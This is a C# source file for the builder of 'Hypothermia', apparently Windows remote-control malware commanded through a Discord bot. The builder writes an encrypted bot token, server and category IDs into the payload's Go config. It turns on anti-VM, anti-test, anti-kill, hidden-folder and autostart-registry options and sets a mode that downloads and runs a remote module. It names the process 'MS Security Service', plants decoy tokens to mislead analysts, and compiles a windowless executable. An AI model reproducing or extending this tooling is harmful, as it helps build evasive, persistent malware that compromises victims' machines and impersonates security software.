using System.Diagnostics;
using System.Text.RegularExpressions;

namespace builder.Source.Main
{
	public class Builder
	{
		public static void Compile(BuilderUI parent)
		{
			string _mainDir = parent.ProjectDirBox.Text;
			if (string.IsNullOrEmpty(_mainDir))
			{
				MessageBox.Show(
					"Main project directory could not be found. Did you leave it empty?",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			#region Settings Vars

			string _token = parent.BotTokenBox.Text;
			string _server = parent.ServerIdBox.Text;
			string _category = parent.CategoryIdBox.Text;

			string _fakeProcName = parent.FakeProcNameBox.Text;
			string _realProcName = parent.RealProcNameBox.Text;

			string _folderName = parent.FolderNameBox.Text;
			string _startKeyName = parent.StartupRegKeyNameBox.Text;

			string _variantName = parent.VariantBox.Text;

			string? _startMode = parent.StartupModeCombo.SelectedItem?.ToString();
			string _startModuleURL = parent.ModuleDownloadBox.Text;
			string _startModuleName = parent.ModuleNameBox.Text;

			bool _antiVM = parent.AntiVmToggle.Checked;
			bool _antiTest = parent.AntiTestModeToggle.Checked;
			bool _hideFolder = parent.HideFolderToggle.Checked;
			bool _autoStart = parent.AutoStartToggle.Checked;
			bool _antiKill = parent.AntiKillToggle.Checked;

			bool _trimStrings = parent.TrimStringsToggle.Checked;
			bool _noWindow = parent.NoWindowToggle.Checked;
			bool _debugMode = parent.DebugModeToggle.Checked;
			bool _cmdScript = parent.CmdScriptToggle.Checked;

			if (string.IsNullOrEmpty(_fakeProcName) || string.IsNullOrEmpty(_fakeProcName))
				_fakeProcName = "Hypothermia";

			if (string.IsNullOrEmpty(_realProcName) || string.IsNullOrEmpty(_realProcName))
				_realProcName = "MS Security Service";

			if (string.IsNullOrEmpty(_folderName) || string.IsNullOrEmpty(_folderName))
				_folderName = "MS Security Module";

			if (string.IsNullOrEmpty(_startKeyName) || string.IsNullOrEmpty(_startKeyName))
				_startKeyName = "MS Security";

			#endregion Settings Vars

			var fastCrypt = Path.Combine(_mainDir, "_helpers", "fast_crypt.go");
			if (!File.Exists(fastCrypt))
			{
				MessageBox.Show(
					"Encryptor file could not be found. Make sure you have Hypothermia version 2 or higher.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			var configDir = Path.Combine(_mainDir, "config");
			if (!Directory.Exists(configDir) || Directory.GetFiles(configDir, "*.go", SearchOption.TopDirectoryOnly).Length < 2)
			{
				MessageBox.Show(
					"Config directory could not be found. Make sure you have Hypothermia version 2 or higher.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			#region Config File

			var configFile = Path.Combine(configDir, "config.go");
			if (!File.Exists(configFile))
			{
				MessageBox.Show(
					"Config file could not be found.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			string newConfigText = $@"
				package config

				const (
					AntiVM       bool = {_antiVM.ToString().ToLower()}
					AntiTestMode bool = {_antiTest.ToString().ToLower()}

					HideFolder bool = {_hideFolder.ToString().ToLower()}
					AutoStart  bool = {_autoStart.ToString().ToLower()}
					AntiKill   bool = {_antiKill.ToString().ToLower()}

					Debugging bool = {_debugMode.ToString().ToLower()}
				)
			";

			File.WriteAllText(configFile, newConfigText);

			var configClean = new ProcessStartInfo
			{
				FileName = "gofmt",
				Arguments = $"-w \"{configFile}\"",
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};

			Process.Start(configClean)?.WaitForExit();

			#endregion Config File

			#region Control File

			var controlFile = Path.Combine(configDir, "control.go");
			if (!File.Exists(controlFile))
			{
				MessageBox.Show(
					"Control file could not be found.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			string controlFileText = File.ReadAllText(controlFile);

			if (!string.IsNullOrEmpty(_token))
			{
				var procInfo = new ProcessStartInfo
				{
					FileName = "go",
					Arguments = $"run \"{fastCrypt}\" \"{_token}\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};

				using (var proc = Process.Start(procInfo))
				{
					string output = proc.StandardOutput.ReadToEnd();
					proc.WaitForExit();

					if (output == "no data provided")
					{
						MessageBox.Show(
							"There was no data provided for encryption.",
							"Build Error",
							MessageBoxButtons.OK,
							MessageBoxIcon.Warning
						);

						return;
					}

					_token = output;
				}

				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bBotToken\s+string\s*=\s*"")[^""]*(?="")",
					_token
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			if (!string.IsNullOrEmpty(_server))
			{
				var procInfo = new ProcessStartInfo
				{
					FileName = "go",
					Arguments = $"run \"{fastCrypt}\" \"{_server}\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};

				using (var proc = Process.Start(procInfo))
				{
					string output = proc.StandardOutput.ReadToEnd();
					proc.WaitForExit();

					if (output == "no data provided")
					{
						MessageBox.Show(
							"There was no data provided for encryption.",
							"Build Error",
							MessageBoxButtons.OK,
							MessageBoxIcon.Warning
						);

						return;
					}

					_server = output;
				}

				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bServerId\s+string\s*=\s*"")[^""]*(?="")",
					_server
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			if (!string.IsNullOrEmpty(_category))
			{
				var procInfo = new ProcessStartInfo
				{
					FileName = "go",
					Arguments = $"run \"{fastCrypt}\" \"{_category}\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};

				using (var proc = Process.Start(procInfo))
				{
					string output = proc.StandardOutput.ReadToEnd();
					proc.WaitForExit();

					if (output == "no data provided")
					{
						MessageBox.Show(
							"There was no data provided for encryption.",
							"Build Error",
							MessageBoxButtons.OK,
							MessageBoxIcon.Warning
						);

						return;
					}

					_category = output;
				}

				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bCategoryId\s+string\s*=\s*"")[^""]*(?="")",
					_category
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			if (!string.IsNullOrEmpty(_startMode))
			{
				int mode = _startMode switch
				{
					"None" => 0,
					"Run incompatible file" => 1,
					"Run module" => 2,
					"Delete original file" => 3,
					_ => 0
				};

				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bStartupMode\s+int\s*=\s*)\d+",
					mode.ToString()
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			if (!string.IsNullOrEmpty(_startModuleURL))
			{
				var procInfo = new ProcessStartInfo
				{
					FileName = "go",
					Arguments = $"run \"{fastCrypt}\" \"{_startModuleURL}\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};

				using (var proc = Process.Start(procInfo))
				{
					string output = proc.StandardOutput.ReadToEnd();
					proc.WaitForExit();

					if (output == "no data provided")
					{
						MessageBox.Show(
							"There was no data provided for encryption.",
							"Build Error",
							MessageBoxButtons.OK,
							MessageBoxIcon.Warning
						);

						return;
					}

					_startModuleURL = output;
				}

				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bModuleUrl\s+string\s*=\s*"")[^""]*(?="")",
					_startModuleURL
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			if (!string.IsNullOrEmpty(_startModuleName))
			{
				controlFileText = Regex.Replace(
					controlFileText,
					@"(?<=\bModuleName\s+string\s*=\s*"")[^""]*(?="")",
					_startModuleName
				);

				File.WriteAllText(controlFile, controlFileText);
			}

			#endregion Config File

			#region Decoy File

			var decoyFile = Path.Combine(configDir, "decoy.go");
			if (!File.Exists(decoyFile))
			{
				MessageBox.Show(
					"Decoy file could not be found.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			string newDecoyText = $@"
				package config

				const (
					FakeToken    string = "" {Random.GenToken()} ""
					FakeServer   string = "" {Random.GenId()} ""
					FakeCategory string = "" {Random.GenId()} ""
				)
			";

			File.WriteAllText(decoyFile, newDecoyText);

			var decoyClean = new ProcessStartInfo
			{
				FileName = "gofmt",
				Arguments = $"-w \"{decoyFile}\"",
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};

			Process.Start(decoyClean)?.WaitForExit();

			#endregion Decoy File

			#region Naming File

			var namingFile = Path.Combine(configDir, "naming.go");
			if (!File.Exists(namingFile))
			{
				MessageBox.Show(
					"Naming file could not be found.",
					"Build Error",
					MessageBoxButtons.OK,
					MessageBoxIcon.Warning
				);

				return;
			}

			string namingFileText = File.ReadAllText(namingFile);

			if (!string.IsNullOrEmpty(_fakeProcName))
			{
				namingFileText = Regex.Replace(
					namingFileText,
					@"(?<=\bFakeProcName\s+string\s*=\s*"")[^""]*(?="")",
					_fakeProcName
				);

				File.WriteAllText(namingFile, namingFileText);
			}

			if (!string.IsNullOrEmpty(_realProcName))
			{
				namingFileText = Regex.Replace(
					namingFileText,
					@"(?<=\bRealProcName\s+string\s*=\s*"")[^""]*(?="")",
					_realProcName
				);

				File.WriteAllText(namingFile, namingFileText);
			}

			if (!string.IsNullOrEmpty(_folderName))
			{
				namingFileText = Regex.Replace(
					namingFileText,
					@"(?<=\bFolderName\s+string\s*=\s*"")[^""]*(?="")",
					_folderName
				);

				File.WriteAllText(namingFile, namingFileText);
			}

			if (!string.IsNullOrEmpty(_startKeyName))
			{
				namingFileText = Regex.Replace(
					namingFileText,
					@"(?<=\bStartupKeyName\s+string\s*=\s*"")[^""]*(?="")",
					_startKeyName
				);

				File.WriteAllText(namingFile, namingFileText);
			}

			if (!string.IsNullOrEmpty(_variantName))
			{
				namingFileText = Regex.Replace(
					namingFileText,
					@"(?<=\bVariant\s+string\s*=\s*"")[^""]*(?="")",
					_variantName
				);

				File.WriteAllText(namingFile, namingFileText);
			}

			namingFileText = Regex.Replace(
				namingFileText,
				@"(?<=\bVerifier\s+string\s*=\s*"")[^""]*(?="")",
				Random.GenString(5)
			);

			File.WriteAllText(namingFile, namingFileText);

			#endregion Naming File

			#region Source Files

			string utilFiles = Path.Combine(_mainDir, "src", "utils", "files.go");
			if (File.Exists(utilFiles))
			{
				string content = File.ReadAllText(utilFiles);

				content = Regex.Replace(
					content,
					@"return\s+""[^""]*""(\s*//\s*HB:\s*ZIP_FILE_PREFIX)",
					$@"return ""{Random.GenString(7)}""$1"
				);

				File.WriteAllText(utilFiles, content);
			}

			#endregion Source Files

			#region Main Building

			string buildDir = Path.Combine(_mainDir, "build");

			string buildArgs = "build" + " ";
			if (_trimStrings && _noWindow)
				buildArgs += "-trimpath -ldflags=\"-w -s -H=windowsgui\"";

			else if (_trimStrings && !_noWindow)
				buildArgs += "-trimpath -ldflags=\"-w -s\"";

			else if (!_trimStrings && _noWindow)
				buildArgs += "-ldflags=\"-H=windowsgui\"";

			string exeName = Path.Combine(buildDir, _fakeProcName) + ".exe";

			var buildProcInfo = new ProcessStartInfo
			{
				FileName = "go",
				Arguments = $"{buildArgs} -o \"{exeName}\" main.go",
				WorkingDirectory = Path.Combine(_mainDir, "src"),
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};

			using (var proc = Process.Start(buildProcInfo))
			{
				proc.WaitForExit();
				if (proc.ExitCode != 0)
				{
					string err = proc.StandardError.ReadToEnd();

					var res = MessageBox.Show(
						$"Hypothermia failed to build.\n\nError: {err}",
						"Build Error",
						MessageBoxButtons.OK,
						MessageBoxIcon.Warning
					);
				}
				else
				{
					var res = MessageBox.Show(
						"Hypothermia built successfully! Do you want to open the folder where the executable is located?",
						"Build Success",
						MessageBoxButtons.YesNo,
						MessageBoxIcon.Information
					);

					if (res == DialogResult.Yes)
						Process.Start("explorer.exe", buildDir);
				}
			}

			#endregion Main Building
		}
	}
}
